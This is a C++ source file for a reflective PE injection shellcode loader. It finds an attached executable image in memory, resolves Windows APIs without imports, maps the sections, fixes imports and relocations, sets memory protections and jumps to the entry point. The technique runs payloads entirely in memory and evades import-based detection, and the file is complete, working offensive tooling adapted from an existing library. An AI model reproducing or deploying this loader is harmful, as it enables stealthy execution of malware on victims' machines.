#include "ReflectiveInjectionShellcode.h"

typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef DWORD(NTAPI* pNtFlushInstructionCache)(HANDLE, PVOID, ULONG);

typedef int(NTAPI* pMain)();

#pragma intrinsic( _ReturnAddress )
__declspec(safebuffers) __declspec(noinline) ULONG_PTR caller(VOID);

__declspec(safebuffers) __declspec(noinline) DWORD CalculateProtectionFlags(unsigned long ulSectionCharacteristics);

__declspec(safebuffers) _declspec(noinline) void ReflectiveInjectionShellcode()
{

	ULONG_PTR dwPeAddress;
	ULONG_PTR dwNtHeaders;
	ULONG_PTR dwBaseAddress;

	ULONG_PTR dwCurrentSection;
	DWORD dwOldProtection;

	/*
	STEP 1
	Well, there is nothing to do here.
	Changes made to the code from the git library:
		* Instead of finding kernel32.dll exports, we use ImportlessApi.hpp.
	*/

	HMODULE hKernel32 = (HMODULE)IMPORTLESS_MODULE(L"kernel32.dll");
	HMODULE hNtdll = (HMODULE)IMPORTLESS_MODULE(L"ntdll.dll");

	decltype(VirtualAlloc)* pVirtualAlloc = IMPORTLESS_API_WITH_MODULE(VirtualAlloc, hKernel32);
	decltype(LoadLibraryA)* pLoadLibraryA = IMPORTLESS_API_WITH_MODULE(LoadLibraryA, hKernel32);
	decltype(GetProcAddress)* pGetProcAddress = IMPORTLESS_API_WITH_MODULE(GetProcAddress, hKernel32);
	decltype(VirtualProtect)* pVirtualProtect = IMPORTLESS_API_WITH_MODULE(VirtualProtect, hKernel32);


	/*
		STEP 0
		Find the PE module attached with the shellcode.
		Changes made to the code from the git library:
			* Instead of going up in the memory we go down.
	*/

	unsigned char* buffer = (unsigned char*)caller();
	dwPeAddress = reinterpret_cast<ULONG_PTR>(buffer);
	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)dwPeAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			dwNtHeaders = ((PIMAGE_DOS_HEADER)dwPeAddress)->e_lfanew;

			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if (dwNtHeaders >= sizeof(IMAGE_DOS_HEADER) && dwNtHeaders < 1024)
			{
				dwNtHeaders = dwPeAddress + dwNtHeaders;

				// break if we have found a valid MZ/PE header
				if (((PIMAGE_NT_HEADERS)dwNtHeaders)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}

		// The PE will be down in memory.
		dwPeAddress++;
	}




	/*
		STEP 2
		Load the image into a new permanent location in memory
		Changes made to the code from the git library:
			* None.
	*/

	// Allocate Read Write Execute memory for the PE file.

	dwBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Copy the headers of the PE file to the new location.
	for (size_t i = 0; i < ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.SizeOfHeaders; i++)
	{
		((BYTE*)dwBaseAddress)[i] = ((BYTE*)dwPeAddress)[i];
	}


	/*
		STEP 3
		Load all the sections
		Changes made to the code from the git library:
			* None.
	*/
	// First section address.
	dwCurrentSection = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwNtHeaders)->FileHeader.SizeOfOptionalHeader);

	// Iterate over number of sections and copy each one.
	for (size_t i = 0; i < ((PIMAGE_NT_HEADERS)dwNtHeaders)->FileHeader.NumberOfSections; i++)
	{
		// VirtualAddress of current section.
		ULONG_PTR dwSectionVirtualAddress = ((PIMAGE_SECTION_HEADER)dwCurrentSection)->VirtualAddress;

		// PhysicalAddress of current section.
		ULONG_PTR dwSectionPhysicalAddress = ((PIMAGE_SECTION_HEADER)dwCurrentSection)->PointerToRawData;

		// Copy the section from the dwPeAddress to dwBaseAddress 
		for (size_t j = 0; j < ((PIMAGE_SECTION_HEADER)dwCurrentSection)->SizeOfRawData; j++)
		{
			((BYTE*)(dwBaseAddress + dwSectionVirtualAddress))[j] = ((BYTE*)(dwPeAddress + dwSectionPhysicalAddress))[j];
		}

		// Find next section.
		dwCurrentSection += sizeof(IMAGE_SECTION_HEADER);
	}

	/*
		STEP 4
		Process image import table.
		Changes made to the code from the git library:
			* None.
	*/

	// The address of the import directory.
	ULONG_PTR dwImportDirectory = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// The address of the first entry in the import directory
	ULONG_PTR dwImportDirectoryAddress = (dwBaseAddress + ((PIMAGE_DATA_DIRECTORY)dwImportDirectory)->VirtualAddress);

	while (((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->Name)
	{
		const char* libraryName = (LPCSTR)((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->Name + dwBaseAddress;
		HMODULE library = pLoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dwBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)dwImportDirectoryAddress)->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)pGetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(dwBaseAddress + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)pGetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		dwImportDirectoryAddress += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	/*
		STEP 5
		Process all of our images relocations.
		Changes made to the code from the git library:
			* Removed ARM support. (TODO - Add)
	*/

	// Calculate the base address delta and perform relocations (even if we load at desired image base)
	ULONG_PTR dwDeltaAddresses = dwBaseAddress - ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.ImageBase;

	ULONG_PTR dwRelocationDirectory = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// Check if there are any relocations present.
	if (((PIMAGE_DATA_DIRECTORY)dwRelocationDirectory)->Size)
	{
		ULONG_PTR dwRelocBlock = (dwBaseAddress + ((PIMAGE_DATA_DIRECTORY)dwRelocationDirectory)->VirtualAddress);


		// Iterate over all relocation entries.
		while (((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock)
		{
			ULONG_PTR dwRelocationBlock = (dwBaseAddress + ((PIMAGE_BASE_RELOCATION)dwRelocBlock)->VirtualAddress);

			ULONG_PTR dwNumberOfEntries = (((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			ULONG_PTR dwCurrentEntry = dwRelocBlock + sizeof(IMAGE_BASE_RELOCATION);

			// Iterate over all entries in the block.
			for (size_t i = 0; i < dwNumberOfEntries; i++)
			{
				if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_DIR64)
				{
					*(ULONG_PTR*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += dwDeltaAddresses;
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_HIGHLOW)
				{
					*(DWORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += (DWORD)dwDeltaAddresses;
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_HIGH)
				{
					*(WORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += HIWORD(dwDeltaAddresses);
				}
				else if (((PIMAGE_RELOC)dwCurrentEntry)->type == IMAGE_REL_BASED_LOW)
				{
					*(WORD*)(dwRelocationBlock + ((PIMAGE_RELOC)dwCurrentEntry)->offset) += LOWORD(dwDeltaAddresses);
				}

				// Get the next entry in the current relocation block.
				dwCurrentEntry += sizeof(IMAGE_RELOC);

				// Removed ARM Support.
			}

			// Get the next block in the reloc table.
			dwRelocBlock = dwRelocBlock + ((PIMAGE_BASE_RELOCATION)dwRelocBlock)->SizeOfBlock;
		}
	}

	/*
		STEP 6
		Call the main address.
		Changes made to the code from the git library:
			* None.
	*/

	ULONG_PTR dwEntryAddress = (dwBaseAddress + ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.AddressOfEntryPoint);


	pVirtualProtect(reinterpret_cast<LPVOID>(dwBaseAddress), ((PIMAGE_NT_HEADERS)dwNtHeaders)->OptionalHeader.SizeOfImage, PAGE_READONLY, &dwOldProtection);

	UINT_PTR pucCurrentSection;
	unsigned int uNumberOfSections;
	DWORD dwOldProtect;

	uNumberOfSections = reinterpret_cast<PIMAGE_NT_HEADERS>(dwNtHeaders)->FileHeader.NumberOfSections;
	pucCurrentSection = reinterpret_cast<UINT_PTR>(IMAGE_FIRST_SECTION(reinterpret_cast<PIMAGE_NT_HEADERS>(dwNtHeaders)));

	for (size_t i = 0; i < uNumberOfSections; i++)
	{
		DWORD dwProtectionFlag = 0;

		dwProtectionFlag = CalculateProtectionFlags(reinterpret_cast<PIMAGE_SECTION_HEADER>(pucCurrentSection)->Characteristics);

		pVirtualProtect(reinterpret_cast<LPVOID>(dwBaseAddress + reinterpret_cast<PIMAGE_SECTION_HEADER>(pucCurrentSection)->VirtualAddress), reinterpret_cast<PIMAGE_SECTION_HEADER>(pucCurrentSection)->Misc.VirtualSize, dwProtectionFlag, &dwOldProtect);

		pucCurrentSection += sizeof(IMAGE_SECTION_HEADER);
	}

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	IMPORTLESS_API_STR_WITH_BASE("NtFlushInstructionCache", hNtdll, pNtFlushInstructionCache)((HANDLE)-1, NULL, 0);

	// TODO. Send command line parameters to support argc argv.
	//int argc = 0;
	//LPSTR* pArgvW = CommandLineToArgv(GetCommandLine(), &argc);
	((pMain)dwEntryAddress)();

	return;
}

__declspec(safebuffers) __declspec(noinline) DWORD CalculateProtectionFlags(unsigned long ulSectionCharacteristics)
{
	DWORD dwProtectionFlags = 0;

	if ((ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_EXECUTE_READWRITE;
	}

	if ((ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_EXECUTE_WRITECOPY;
	}

	if ((ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_EXECUTE_READ;
	}

	if ((ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_EXECUTE;
	}

	if (!(ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_READWRITE;
	}

	if (!(ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_WRITECOPY;
	}

	if (!(ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& (ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_READONLY;
	}

	if (!(ulSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
		&& !(ulSectionCharacteristics & IMAGE_SCN_MEM_READ))
	{
		dwProtectionFlags |= PAGE_NOACCESS;
	}


	if (ulSectionCharacteristics & IMAGE_SCN_MEM_NOT_CACHED)
	{
		dwProtectionFlags |= PAGE_NOCACHE;
	}

	return dwProtectionFlags;

}

__declspec(safebuffers) __declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

__declspec(safebuffers) __declspec(noinline) void ReflectiveInjectionShellcode_Marked()
{
	volatile int x = 0;
}







